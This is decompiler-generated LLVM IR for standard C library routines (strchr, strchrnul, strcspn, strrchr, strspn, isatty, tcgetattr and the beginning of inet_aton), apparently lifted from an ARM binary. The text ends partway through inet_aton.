declare i32 @strlen(i8*) local_unnamed_addr

define i32 @__GI_strchr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r1, align 4
  %v1_185f4 = urem i32 %arg1, 256
  %v0_186143 = load i32, i32* @r0, align 4
  %v1_186144 = urem i32 %v0_186143, 4
  %v2_186145 = icmp eq i32 %v1_186144, 0
  br i1 %v2_186145, label %dec_label_pc_1861c, label %dec_label_pc_185fc

dec_label_pc_185fc:                               ; preds = %entry, %dec_label_pc_18610
  %v0_18610 = phi i32 [ %v1_18610, %dec_label_pc_18610 ], [ %v0_186143, %entry ]
  %v1_185fc = inttoptr i32 %v0_18610 to i8*
  %v2_185fc = load i8, i8* %v1_185fc, align 1
  %v3_185fc = zext i8 %v2_185fc to i32
  %v9_18600 = icmp eq i32 %v3_185fc, %v1_185f4
  br i1 %v9_18600, label %dec_label_pc_186d0, label %dec_label_pc_18608

dec_label_pc_18608:                               ; preds = %dec_label_pc_185fc
  %v2_18608 = icmp eq i8 %v2_185fc, 0
  br i1 %v2_18608, label %dec_label_pc_186cc, label %dec_label_pc_18610

dec_label_pc_18610:                               ; preds = %dec_label_pc_18608
  %v1_18610 = add i32 %v0_18610, 1
  %v1_18614 = urem i32 %v1_18610, 4
  %v2_18614 = icmp eq i32 %v1_18614, 0
  br i1 %v2_18614, label %dec_label_pc_1861c, label %dec_label_pc_185fc

dec_label_pc_1861c:                               ; preds = %dec_label_pc_18610, %entry
  %v0_18620 = phi i32 [ %v0_186143, %entry ], [ %v1_18610, %dec_label_pc_18610 ]
  %v4_1861c = mul nuw nsw i32 %v1_185f4, 256
  %v5_1861c = or i32 %v4_1861c, %v1_185f4
  %v4_18624 = mul i32 %v5_1861c, 65536
  %v5_18624 = or i32 %v4_18624, %v5_1861c
  br label %dec_label_pc_18628

dec_label_pc_18628:                               ; preds = %dec_label_pc_186c4, %dec_label_pc_18664, %dec_label_pc_1861c
  %v0_1868c = phi i32 [ %v0_18620, %dec_label_pc_1861c ], [ %v4_18628, %dec_label_pc_18664 ], [ %v4_18628, %dec_label_pc_186c4 ]
  %v1_18628 = inttoptr i32 %v0_1868c to i32*
  %v2_18628 = load i32, i32* %v1_18628, align 4
  %v4_18628 = add i32 %v0_1868c, 4
  %v2_18630 = xor i32 %v2_18628, %v5_18624
  %v2_1863c = add i32 %v2_18628, 2130640639
  %v1_18640 = sub i32 -1, %v2_18628
  %v2_18644 = xor i32 %v2_1863c, %v1_18640
  %v2_18650 = and i32 %v2_18644, -2130640640
  store i32 %v2_18650, i32* @r1, align 4
  %v2_18658 = icmp eq i32 %v2_18650, 0
  br i1 %v2_18658, label %dec_label_pc_18664, label %dec_label_pc_1866c

dec_label_pc_18664:                               ; preds = %dec_label_pc_18628
  %v2_18634 = add i32 %v2_18630, 2130640639
  %v1_1864c = sub i32 -1, %v2_18630
  %v2_18654 = xor i32 %v2_18634, %v1_1864c
  %v2_1865c = and i32 %v2_18654, -2130640640
  %v2_18664 = icmp eq i32 %v2_1865c, 0
  br i1 %v2_18664, label %dec_label_pc_18628, label %dec_label_pc_1866c

dec_label_pc_1866c:                               ; preds = %dec_label_pc_18628, %dec_label_pc_18664
  %v2_1866c = inttoptr i32 %v0_1868c to i8*
  %v3_1866c = load i8, i8* %v2_1866c, align 1
  %v4_1866c = zext i8 %v3_1866c to i32
  %v9_18670 = icmp eq i32 %v4_1866c, %v1_185f4
  br i1 %v9_18670, label %dec_label_pc_186d0, label %dec_label_pc_1867c

dec_label_pc_1867c:                               ; preds = %dec_label_pc_1866c
  %v2_1867c = icmp eq i8 %v3_1866c, 0
  br i1 %v2_1867c, label %dec_label_pc_186cc, label %dec_label_pc_18684

dec_label_pc_18684:                               ; preds = %dec_label_pc_1867c
  %v1_18684 = add i32 %v0_1868c, 1
  %v2_18684 = inttoptr i32 %v1_18684 to i8*
  %v3_18684 = load i8, i8* %v2_18684, align 1
  %v4_18684 = zext i8 %v3_18684 to i32
  %v9_18688 = icmp eq i32 %v4_18684, %v1_185f4
  br i1 %v9_18688, label %dec_label_pc_186d0, label %dec_label_pc_18694

dec_label_pc_18694:                               ; preds = %dec_label_pc_18684
  %v2_18694 = icmp eq i8 %v3_18684, 0
  br i1 %v2_18694, label %dec_label_pc_186cc, label %dec_label_pc_1869c

dec_label_pc_1869c:                               ; preds = %dec_label_pc_18694
  %v1_1869c = add i32 %v0_1868c, 2
  %v2_1869c = inttoptr i32 %v1_1869c to i8*
  %v3_1869c = load i8, i8* %v2_1869c, align 1
  %v4_1869c = zext i8 %v3_1869c to i32
  %v9_186a0 = icmp eq i32 %v4_1869c, %v1_185f4
  br i1 %v9_186a0, label %dec_label_pc_186d0, label %dec_label_pc_186ac

dec_label_pc_186ac:                               ; preds = %dec_label_pc_1869c
  %v2_186ac = icmp eq i8 %v3_1869c, 0
  br i1 %v2_186ac, label %dec_label_pc_186cc, label %dec_label_pc_186b4

dec_label_pc_186b4:                               ; preds = %dec_label_pc_186ac
  %v1_186b4 = add i32 %v0_1868c, 3
  %v2_186b4 = inttoptr i32 %v1_186b4 to i8*
  %v3_186b4 = load i8, i8* %v2_186b4, align 1
  %v4_186b4 = zext i8 %v3_186b4 to i32
  %v9_186b8 = icmp eq i32 %v4_186b4, %v1_185f4
  br i1 %v9_186b8, label %dec_label_pc_186d0, label %dec_label_pc_186c4

dec_label_pc_186c4:                               ; preds = %dec_label_pc_186b4
  %v2_186c4 = icmp eq i8 %v3_186b4, 0
  br i1 %v2_186c4, label %dec_label_pc_186cc, label %dec_label_pc_18628

dec_label_pc_186cc:                               ; preds = %dec_label_pc_18608, %dec_label_pc_186c4, %dec_label_pc_186ac, %dec_label_pc_18694, %dec_label_pc_1867c
  br label %dec_label_pc_186d0

dec_label_pc_186d0:                               ; preds = %dec_label_pc_185fc, %dec_label_pc_186b4, %dec_label_pc_1869c, %dec_label_pc_18684, %dec_label_pc_1866c, %dec_label_pc_186cc
  %v1_186d4 = phi i32 [ 0, %dec_label_pc_186cc ], [ %v1_186b4, %dec_label_pc_186b4 ], [ %v1_1869c, %dec_label_pc_1869c ], [ %v1_18684, %dec_label_pc_18684 ], [ %v0_1868c, %dec_label_pc_1866c ], [ %v0_18610, %dec_label_pc_185fc ]
  ret i32 %v1_186d4

; uselistorder directives
  uselistorder i32 %v4_18628, { 1, 0 }
  uselistorder i32 %v2_18628, { 0, 2, 1 }
  uselistorder i32 %v0_1868c, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v5_1861c, { 1, 0 }
  uselistorder i32 %v1_18610, { 1, 0, 2 }
  uselistorder i32 %v0_186143, { 2, 1, 0 }
  uselistorder i32 %v1_185f4, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder label %dec_label_pc_186d0, { 5, 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_186cc, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_1866c, { 1, 0 }
  uselistorder label %dec_label_pc_185fc, { 1, 0 }
}

define i32 @__GI_strchrnul(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r1, align 4
  %v1_186e4 = urem i32 %arg1, 256
  %v0_187042 = load i32, i32* @r0, align 4
  %v1_187043 = urem i32 %v0_187042, 4
  %v2_187044 = icmp eq i32 %v1_187043, 0
  br i1 %v2_187044, label %dec_label_pc_1870c, label %dec_label_pc_186ec

dec_label_pc_186ec:                               ; preds = %entry, %dec_label_pc_18700
  %v0_18700 = phi i32 [ %v1_18700, %dec_label_pc_18700 ], [ %v0_187042, %entry ]
  %v1_186ec = inttoptr i32 %v0_18700 to i8*
  %v2_186ec = load i8, i8* %v1_186ec, align 1
  %v3_186ec = zext i8 %v2_186ec to i32
  %v9_186f0 = icmp eq i32 %v3_186ec, %v1_186e4
  br i1 %v9_186f0, label %dec_label_pc_187bc, label %dec_label_pc_186f8

dec_label_pc_186f8:                               ; preds = %dec_label_pc_186ec
  %v2_186f8 = icmp eq i8 %v2_186ec, 0
  br i1 %v2_186f8, label %dec_label_pc_187bc, label %dec_label_pc_18700

dec_label_pc_18700:                               ; preds = %dec_label_pc_186f8
  %v1_18700 = add i32 %v0_18700, 1
  %v1_18704 = urem i32 %v1_18700, 4
  %v2_18704 = icmp eq i32 %v1_18704, 0
  br i1 %v2_18704, label %dec_label_pc_1870c, label %dec_label_pc_186ec

dec_label_pc_1870c:                               ; preds = %dec_label_pc_18700, %entry
  %v0_18710 = phi i32 [ %v0_187042, %entry ], [ %v1_18700, %dec_label_pc_18700 ]
  %v4_1870c = mul nuw nsw i32 %v1_186e4, 256
  %v5_1870c = or i32 %v4_1870c, %v1_186e4
  %v4_18714 = mul i32 %v5_1870c, 65536
  %v5_18714 = or i32 %v4_18714, %v5_1870c
  br label %dec_label_pc_18718

dec_label_pc_18718:                               ; preds = %dec_label_pc_187b4, %dec_label_pc_18754, %dec_label_pc_1870c
  %v0_1877c = phi i32 [ %v0_18710, %dec_label_pc_1870c ], [ %v4_18718, %dec_label_pc_18754 ], [ %v4_18718, %dec_label_pc_187b4 ]
  %v1_18718 = inttoptr i32 %v0_1877c to i32*
  %v2_18718 = load i32, i32* %v1_18718, align 4
  %v4_18718 = add i32 %v0_1877c, 4
  %v2_18720 = xor i32 %v2_18718, %v5_18714
  %v2_1872c = add i32 %v2_18718, 2130640639
  %v1_18730 = sub i32 -1, %v2_18718
  %v2_18734 = xor i32 %v2_1872c, %v1_18730
  %v2_18740 = and i32 %v2_18734, -2130640640
  store i32 %v2_18740, i32* @r1, align 4
  %v2_18748 = icmp eq i32 %v2_18740, 0
  br i1 %v2_18748, label %dec_label_pc_18754, label %dec_label_pc_1875c

dec_label_pc_18754:                               ; preds = %dec_label_pc_18718
  %v2_18724 = add i32 %v2_18720, 2130640639
  %v1_1873c = sub i32 -1, %v2_18720
  %v2_18744 = xor i32 %v2_18724, %v1_1873c
  %v2_1874c = and i32 %v2_18744, -2130640640
  %v2_18754 = icmp eq i32 %v2_1874c, 0
  br i1 %v2_18754, label %dec_label_pc_18718, label %dec_label_pc_1875c

dec_label_pc_1875c:                               ; preds = %dec_label_pc_18718, %dec_label_pc_18754
  %v2_1875c = inttoptr i32 %v0_1877c to i8*
  %v3_1875c = load i8, i8* %v2_1875c, align 1
  %v4_1875c = zext i8 %v3_1875c to i32
  %v9_18760 = icmp eq i32 %v4_1875c, %v1_186e4
  br i1 %v9_18760, label %dec_label_pc_187bc, label %dec_label_pc_1876c

dec_label_pc_1876c:                               ; preds = %dec_label_pc_1875c
  %v2_1876c = icmp eq i8 %v3_1875c, 0
  br i1 %v2_1876c, label %dec_label_pc_187bc, label %dec_label_pc_18774

dec_label_pc_18774:                               ; preds = %dec_label_pc_1876c
  %v1_18774 = add i32 %v0_1877c, 1
  %v2_18774 = inttoptr i32 %v1_18774 to i8*
  %v3_18774 = load i8, i8* %v2_18774, align 1
  %v4_18774 = zext i8 %v3_18774 to i32
  %v9_18778 = icmp eq i32 %v4_18774, %v1_186e4
  br i1 %v9_18778, label %dec_label_pc_187bc, label %dec_label_pc_18784

dec_label_pc_18784:                               ; preds = %dec_label_pc_18774
  %v2_18784 = icmp eq i8 %v3_18774, 0
  br i1 %v2_18784, label %dec_label_pc_187bc, label %dec_label_pc_1878c

dec_label_pc_1878c:                               ; preds = %dec_label_pc_18784
  %v1_1878c = add i32 %v0_1877c, 2
  %v2_1878c = inttoptr i32 %v1_1878c to i8*
  %v3_1878c = load i8, i8* %v2_1878c, align 1
  %v4_1878c = zext i8 %v3_1878c to i32
  %v9_18790 = icmp eq i32 %v4_1878c, %v1_186e4
  br i1 %v9_18790, label %dec_label_pc_187bc, label %dec_label_pc_1879c

dec_label_pc_1879c:                               ; preds = %dec_label_pc_1878c
  %v2_1879c = icmp eq i8 %v3_1878c, 0
  br i1 %v2_1879c, label %dec_label_pc_187bc, label %dec_label_pc_187a4

dec_label_pc_187a4:                               ; preds = %dec_label_pc_1879c
  %v1_187a4 = add i32 %v0_1877c, 3
  %v2_187a4 = inttoptr i32 %v1_187a4 to i8*
  %v3_187a4 = load i8, i8* %v2_187a4, align 1
  %v4_187a4 = zext i8 %v3_187a4 to i32
  %v9_187a8 = icmp eq i32 %v4_187a4, %v1_186e4
  br i1 %v9_187a8, label %dec_label_pc_187bc, label %dec_label_pc_187b4

dec_label_pc_187b4:                               ; preds = %dec_label_pc_187a4
  %v2_187b4 = icmp eq i8 %v3_187a4, 0
  br i1 %v2_187b4, label %dec_label_pc_187bc, label %dec_label_pc_18718

dec_label_pc_187bc:                               ; preds = %dec_label_pc_186f8, %dec_label_pc_186ec, %dec_label_pc_187b4, %dec_label_pc_187a4, %dec_label_pc_1879c, %dec_label_pc_1878c, %dec_label_pc_18784, %dec_label_pc_18774, %dec_label_pc_1876c, %dec_label_pc_1875c
  %v1_187c0 = phi i32 [ %v1_187a4, %dec_label_pc_187b4 ], [ %v1_187a4, %dec_label_pc_187a4 ], [ %v1_1878c, %dec_label_pc_1879c ], [ %v1_1878c, %dec_label_pc_1878c ], [ %v1_18774, %dec_label_pc_18784 ], [ %v1_18774, %dec_label_pc_18774 ], [ %v0_1877c, %dec_label_pc_1876c ], [ %v0_1877c, %dec_label_pc_1875c ], [ %v0_18700, %dec_label_pc_186ec ], [ %v0_18700, %dec_label_pc_186f8 ]
  ret i32 %v1_187c0

; uselistorder directives
  uselistorder i32 %v4_18718, { 1, 0 }
  uselistorder i32 %v2_18718, { 0, 2, 1 }
  uselistorder i32 %v0_1877c, { 0, 1, 2, 3, 4, 5, 7, 6 }
  uselistorder i32 %v5_1870c, { 1, 0 }
  uselistorder i32 %v1_18700, { 1, 0, 2 }
  uselistorder i32 %v0_187042, { 2, 1, 0 }
  uselistorder i32 %v1_186e4, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder i32 2130640639, { 2, 0, 3, 1 }
  uselistorder label %dec_label_pc_187bc, { 2, 3, 4, 5, 6, 7, 8, 9, 0, 1 }
  uselistorder label %dec_label_pc_1875c, { 1, 0 }
  uselistorder label %dec_label_pc_186ec, { 1, 0 }
}

define i32 @strcspn() local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v3_187cc = load i32, i32* @r4, align 4
  store i32 %v3_187cc, i32* %stack_var_-16, align 4
  %v6_187cc = load i32, i32* @r5, align 4
  %v9_187cc = load i32, i32* @r6, align 4
  %v0_187d0 = load i32, i32* @r0, align 4
  %v0_187d4 = load i32, i32* @r1, align 4
  store i32 %v0_187d4, i32* @r6, align 4
  store i32 0, i32* @r5, align 4
  %v1_187f08 = inttoptr i32 %v0_187d0 to i8*
  %v2_187f09 = load i8, i8* %v1_187f08, align 1
  %v3_187f010 = zext i8 %v2_187f09 to i32
  store i32 %v3_187f010, i32* @r1, align 4
  %v2_187f411 = icmp eq i8 %v2_187f09, 0
  store i32 %v0_187d4, i32* @r0, align 4
  %v1_187fc12 = add i32 %v0_187d0, 1
  store i32 %v1_187fc12, i32* @r4, align 4
  br i1 %v2_187f411, label %dec_label_pc_18804, label %dec_label_pc_187e0

dec_label_pc_187e0:                               ; preds = %entry, %dec_label_pc_187ec
  %v3_187f014 = phi i32 [ %v3_187f0, %dec_label_pc_187ec ], [ %v3_187f010, %entry ]
  %v0_187f813 = phi i32 [ %v0_187f8.pre, %dec_label_pc_187ec ], [ %v0_187d4, %entry ]
  %v2_187e0 = call i32 @__GI_strchr(i32 %v0_187f813, i32 %v3_187f014)
  %v2_187e4 = icmp eq i32 %v2_187e0, 0
  %v0_187ec = load i32, i32* @r5, align 4
  br i1 %v2_187e4, label %dec_label_pc_187ec, label %dec_label_pc_18804

dec_label_pc_187ec:                               ; preds = %dec_label_pc_187e0
  %v1_187ec = add i32 %v0_187ec, 1
  %v0_187f0.pre = load i32, i32* @r4, align 4
  %v0_187f8.pre = load i32, i32* @r6, align 4
  store i32 %v1_187ec, i32* @r5, align 4
  %v1_187f0 = inttoptr i32 %v0_187f0.pre to i8*
  %v2_187f0 = load i8, i8* %v1_187f0, align 1
  %v3_187f0 = zext i8 %v2_187f0 to i32
  store i32 %v3_187f0, i32* @r1, align 4
  %v2_187f4 = icmp eq i8 %v2_187f0, 0
  store i32 %v0_187f8.pre, i32* @r0, align 4
  %v1_187fc = add i32 %v0_187f0.pre, 1
  store i32 %v1_187fc, i32* @r4, align 4
  br i1 %v2_187f4, label %dec_label_pc_18804, label %dec_label_pc_187e0

dec_label_pc_18804:                               ; preds = %dec_label_pc_187ec, %dec_label_pc_187e0, %entry
  %v0_18804 = phi i32 [ 0, %entry ], [ %v0_187ec, %dec_label_pc_187e0 ], [ %v1_187ec, %dec_label_pc_187ec ]
  %v2_18808 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_18808, i32* @r4, align 4
  store i32 %v6_187cc, i32* @r5, align 4
  store i32 %v9_187cc, i32* @r6, align 4
  ret i32 %v0_18804

; uselistorder directives
  uselistorder i32 %v3_187f0, { 1, 0 }
  uselistorder i32 %v0_187f8.pre, { 1, 0 }
  uselistorder i32 %v0_187f0.pre, { 1, 0 }
  uselistorder label %dec_label_pc_187e0, { 1, 0 }
}

define i32 @__GI_strrchr(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v1_18814 = urem i32 %arg2, 256
  store i32 %v1_18814, i32* @r4, align 4
  %v2_18814 = icmp eq i32 %v1_18814, 0
  br i1 %v2_18814, label %dec_label_pc_18828, label %dec_label_pc_1883c.preheader

dec_label_pc_1883c.preheader:                     ; preds = %entry
  store i32 0, i32* @r5, align 4
  store i32 %arg1, i32* @r0, align 4
  %v2_188443 = call i32 @__GI_strchr(i32 %arg1, i32 %v1_18814)
  %v2_188485 = icmp eq i32 %v2_188443, 0
  br i1 %v2_188485, label %dec_label_pc_18850, label %dec_label_pc_18834

dec_label_pc_18828:                               ; preds = %entry
  %v2_1882c = call i32 @__GI_strchr(i32 %arg1, i32 0)
  br label %dec_label_pc_18854

dec_label_pc_18834:                               ; preds = %dec_label_pc_1883c.preheader, %dec_label_pc_18834
  %v2_188446 = phi i32 [ %v2_18844, %dec_label_pc_18834 ], [ %v2_188443, %dec_label_pc_1883c.preheader ]
  store i32 %v2_188446, i32* @r5, align 4
  %v1_18838 = add i32 %v2_188446, 1
  store i32 %v1_18838, i32* @r0, align 4
  %v0_18840 = load i32, i32* @r4, align 4
  %v2_18844 = call i32 @__GI_strchr(i32 %v1_18838, i32 %v0_18840)
  %v2_18848 = icmp eq i32 %v2_18844, 0
  br i1 %v2_18848, label %dec_label_pc_18850, label %dec_label_pc_18834

dec_label_pc_18850:                               ; preds = %dec_label_pc_18834, %dec_label_pc_1883c.preheader
  %v0_18850 = load i32, i32* @r5, align 4
  br label %dec_label_pc_18854

dec_label_pc_18854:                               ; preds = %dec_label_pc_18828, %dec_label_pc_18850
  %storemerge = phi i32 [ %v2_1882c, %dec_label_pc_18828 ], [ %v0_18850, %dec_label_pc_18850 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_18844, { 1, 0 }
  uselistorder i32 %v1_18838, { 1, 0 }
  uselistorder i32 %v1_18814, { 2, 1, 0 }
  uselistorder i32 (i32, i32)* @__GI_strchr, { 2, 1, 0, 5, 4, 3 }
  uselistorder i32 %arg1, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_18854, { 1, 0 }
  uselistorder label %dec_label_pc_18834, { 1, 0 }
}

define i32 @__GI_strspn(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r1, align 4
  %v0_188902 = load i32, i32* @r0, align 4
  %v1_188903 = inttoptr i32 %v0_188902 to i8*
  %v2_188904 = load i8, i8* %v1_188903, align 1
  %v2_188946 = icmp eq i8 %v2_188904, 0
  br i1 %v2_188946, label %dec_label_pc_188a0, label %dec_label_pc_18874.preheader

dec_label_pc_1886c:                               ; preds = %dec_label_pc_18874
  %v1_1887c = add i32 %v0_1887c, 1
  %v9_1886c = icmp eq i8 %v0_1886c10.in, %v2_18874
  br i1 %v9_1886c, label %dec_label_pc_18888, label %dec_label_pc_18874

dec_label_pc_18874:                               ; preds = %dec_label_pc_18874.preheader, %dec_label_pc_1886c
  %v0_1887c = phi i32 [ %tmp, %dec_label_pc_18874.preheader ], [ %v1_1887c, %dec_label_pc_1886c ]
  %v1_18874 = inttoptr i32 %v0_1887c to i8*
  %v2_18874 = load i8, i8* %v1_18874, align 1
  %v2_18878 = icmp eq i8 %v2_18874, 0
  br i1 %v2_18878, label %dec_label_pc_188a0, label %dec_label_pc_1886c

dec_label_pc_18888:                               ; preds = %dec_label_pc_1886c
  %v1_18888 = add i32 %v0_18888, 1
  %v1_1888c = add i32 %v0_1888c, 1
  %v1_18890 = inttoptr i32 %v1_1888c to i8*
  %v2_18890 = load i8, i8* %v1_18890, align 1
  %v2_18894 = icmp eq i8 %v2_18890, 0
  br i1 %v2_18894, label %dec_label_pc_188a0, label %dec_label_pc_18874.preheader

dec_label_pc_18874.preheader:                     ; preds = %entry, %dec_label_pc_18888
  %v0_1888c = phi i32 [ %v1_1888c, %dec_label_pc_18888 ], [ %v0_188902, %entry ]
  %v0_18888 = phi i32 [ %v1_18888, %dec_label_pc_18888 ], [ 0, %entry ]
  %v0_1886c10.in = phi i8 [ %v2_18890, %dec_label_pc_18888 ], [ %v2_188904, %entry ]
  br label %dec_label_pc_18874

dec_label_pc_188a0:                               ; preds = %dec_label_pc_18888, %dec_label_pc_18874, %entry
  %v0_188a0 = phi i32 [ 0, %entry ], [ %v0_18888, %dec_label_pc_18874 ], [ %v1_18888, %dec_label_pc_18888 ]
  ret i32 %v0_188a0

; uselistorder directives
  uselistorder i8 %v2_18874, { 1, 0 }
  uselistorder i32 %v0_1887c, { 1, 0 }
  uselistorder label %dec_label_pc_18874.preheader, { 1, 0 }
}

define i32 @isatty(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  %v2_188b4 = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v2_188b4, i32* @r1, align 4
  %v0_188b8 = call i32 @__GI_tcgetattr()
  %v1_188bc = sub i32 1, %v0_188b8
  %v2_188bc = icmp ult i32 %v0_188b8, 2
  br i1 %v2_188bc, label %bb5, label %bb

bb:                                               ; preds = %entry
  br label %bb5

bb5:                                              ; preds = %entry, %bb
  %v1_188cc = phi i32 [ %v1_188bc, %entry ], [ 0, %bb ]
  ret i32 %v1_188cc

; uselistorder directives
  uselistorder i32 %v0_188b8, { 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @__GI_tcgetattr() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %tmp = call i8 @__decompiler_undefined_function_1()
  %stack_var_-35 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %v3_188d0 = load i32, i32* @r4, align 4
  %v6_188d0 = load i32, i32* @r5, align 4
  %v9_188d0 = load i32, i32* @r6, align 4
  %v2_188d8 = ptrtoint i32* %stack_var_-52 to i32
  %v0_188dc = load i32, i32* @r1, align 4
  store i32 %v0_188dc, i32* @r4, align 4
  store i32 21505, i32* %r1.global-to-local, align 4
  %v0_188e8 = load i32, i32* @r0, align 4
  %v3_188e8 = call i32 @ioctl(i32 %v0_188e8, i32 21505, i32 %v2_188d8)
  store i32 %v3_188e8, i32* %r0.global-to-local, align 4
  store i32 %v3_188e8, i32* @r5, align 4
  %v2_188ec = icmp eq i32 %v3_188e8, 0
  br i1 %v2_188ec, label %dec_label_pc_188f4, label %dec_label_pc_18938

dec_label_pc_188f4:                               ; preds = %entry
  %v4_18900 = zext i8 %tmp to i32
  store i32 %v4_18900, i32* @ip, align 4
  %v3_18904 = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_18904, i32* @r3, align 4
  %v1_18908 = load i32, i32* @r4, align 4
  %v2_18908 = add i32 %v1_18908, 4
  %v3_18908 = inttoptr i32 %v2_18908 to i32*
  %v0_1890c = load i32, i32* %r1.global-to-local, align 4
  %v1_1890c = load i32, i32* @r4, align 4
  %v2_1890c = add i32 %v1_1890c, 8
  %v3_1890c = inttoptr i32 %v2_1890c to i32*
  store i32 %v0_1890c, i32* %v3_1890c, align 4
  %v0_18910 = load i32, i32* %r0.global-to-local, align 4
  %v1_18910 = load i32, i32* @r4, align 4
  %v2_18910 = add i32 %v1_18910, 12
  %v3_18910 = inttoptr i32 %v2_18910 to i32*
  store i32 %v0_18910, i32* %v3_18910, align 4
  %v2_18914 = ptrtoint i32* %stack_var_-35 to i32
  store i32 %v2_18914, i32* @r1, align 4
  %v1_1891c = load i32, i32* @r4, align 4
  %v2_1891c = inttoptr i32 %v1_1891c to i32*
  store i32 %v3_18904, i32* %v2_1891c, align 4
  %v0_18920 = load i32, i32* @ip, align 4
  %v1_18920 = trunc i32 %v0_18920 to i8
  %v2_18920 = load i32, i32* @r4, align 4
  %v3_18920 = add i32 %v2_18920, 16
  %v4_18920 = inttoptr i32 %v3_18920 to i8*
  store i8 %v1_18920, i8* %v4_18920, align 1
  %v0_18924 = load i32, i32* @r4, align 4
  %v1_18924 = add i32 %v0_18924, 17
  store i32 %v1_18924, i32* %r0.global-to-local, align 4
  %v4_18928 = call i32 @__GI_mempcpy(i32 %v1_18924, i32 %v2_18914, i32 19, i32 %v3_18904)
  store i32 %v4_18928, i32* %r0.global-to-local, align 4
  %v0_1892c = load i32, i32* @r5, align 4
  store i32 %v0_1892c, i32* %r1.global-to-local, align 4
  %v3_18934 = inttoptr i32 %v4_18928 to i8*
  %v4_18934 = call i32 @__GI_memset(i8* %v3_18934, i32 %v0_1892c, i32 13)
  store i32 %v4_18934, i32* %r0.global-to-local, align 4
  %v0_18938.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_18938

dec_label_pc_18938:                               ; preds = %entry, %dec_label_pc_188f4
  %v0_18938 = phi i32 [ %v3_188e8, %entry ], [ %v0_18938.pre, %dec_label_pc_188f4 ]
  store i32 %v0_18938, i32* %r0.global-to-local, align 4
  store i32 %v3_188d0, i32* @r4, align 4
  store i32 %v6_188d0, i32* @r5, align 4
  store i32 %v9_188d0, i32* @r6, align 4
  ret i32 %v0_18938

; uselistorder directives
  uselistorder i32 %v0_18938, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32 17, { 14, 1, 4, 15, 13, 16, 5, 6, 7, 8, 2, 17, 3, 18, 19, 9, 20, 10, 21, 22, 23, 0, 24, 11, 25, 12 }
  uselistorder i32 (i32, i32, i32)* @ioctl, { 2, 1, 0 }
  uselistorder label %dec_label_pc_18938, { 1, 0 }
}

define i32 @inet_aton() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_1894c = load i32, i32* @r4, align 4
  store i32 %v3_1894c, i32* %stack_var_-28, align 4
  %v0_18954 = load i32, i32* @r0, align 4
  %v2_18954 = icmp eq i32 %v0_18954, 0
  %v0_1895c = load i32, i32* @r1, align 4
  br i1 %v2_18954, label %dec_label_pc_18a30, label %dec_label_pc_18964

dec_label_pc_18964:                               ; preds = %entry
  br label %dec_label_pc_1897c

dec_label_pc_1897c:                               ; preds = %dec_label_pc_18964, %dec_label_pc_189f4
  %v1_189f4 = phi i32 [ 0, %dec_label_pc_18964 ], [ %v5_189f4, %dec_label_pc_189f4 ]
  %v0_189f8 = phi i32 [ 1, %dec_label_pc_18964 ], [ %v1_189f8, %dec_label_pc_189f4 ]
  %v0_1897c = phi i32 [ %v0_18954, %dec_label_pc_18964 ], [ %v0_1897c13, %dec_label_pc_189f4 ]
  %v1_1897c = inttoptr i32 %v0_1897c to i8*
  %v2_1897c = load i8, i8* %v1_1897c, align 1
  %v3_1897c = zext i8 %v2_1897c to i32
  %v4_18980 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23010.367 to i32), i32 272) to i32*), align 4
  %v2_18984 = mul nuw nsw i32 %v3_1897c, 2
  %v2_18988 = add i32 %v2_18984, %v4_18980
  %v3_18988 = inttoptr i32 %v2_18988 to i16*
  %v4_18988 = load i16, i16* %v3_18988, align 2
  %v1_1898c = and i16 %v4_18988, 8
  %v2_1898c = icmp eq i16 %v1_1898c, 0
  br i1 %v2_1898c, label %dec_label_pc_18a30, label %dec_label_pc_18994

dec_label_pc_18994:                               ; preds = %dec_label_pc_1897c
  br label %dec_label_pc_189b4

dec_label_pc_1899c:                               ; preds = %dec_label_pc_189b4
  %v2_1899c = mul i32 %v0_189f4, 10
  %v1_189a0 = add i32 %v2_1899c, -48
  %v2_189a4 = add i32 %v3_189b4, %v1_189a0
  %v8_189ac = icmp sgt i32 %v2_189a4, 255
  br i1 %v8_189ac, label %dec_label_pc_18a30, label %dec_label_pc_189b0

dec_label_pc_189b0:                               ; preds = %dec_label_pc_1899c
  %v1_189b0 = add i32 %v0_189e4, 1
  store i32 %v1_189b0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_189b4

dec_label_pc_189b4:                               ; preds = %dec_label_pc_18994, %dec_label_pc_189b0
  %v0_189f4 = phi i32 [ 0, %dec_label_pc_18994 ], [ %v2_189a4, %dec_label_pc_189b0 ]
  %v0_189e4 = phi i32 [ %v0_1897c, %dec_label_pc_18994 ], [ %v1_189b0, %dec_label_pc_189b0 ]
  %v1_189b4 = inttoptr i32 %v0_189e4 to i8*
  %v2_189b4 = load i8, i8* %v1_189b4, align 1
  %v3_189b4 = zext i8 %v2_189b4 to i32
  %v2_189b8 = mul nuw nsw i32 %v3_189b4, 2
